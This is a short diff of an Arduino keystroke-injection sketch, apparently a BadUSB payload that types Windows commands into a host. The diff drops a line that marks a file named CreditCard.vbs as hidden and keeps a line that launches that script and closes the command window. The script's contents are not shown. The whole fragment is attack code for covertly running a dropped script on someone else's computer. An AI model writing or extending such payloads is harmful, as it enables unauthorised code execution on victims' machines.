@@ -96,9 +96,6 @@ void setup()
   Keyboard.print(F("\""));
   typeKey(KEY_RETURN); 
   delay(50); 
-  Keyboard.print("attrib +h CreditCard.vbs");
-  typeKey(KEY_RETURN); 
-  delay(50); 
   Keyboard.print("start CreditCard.vbs && exit");
   typeKey(KEY_RETURN);
 }
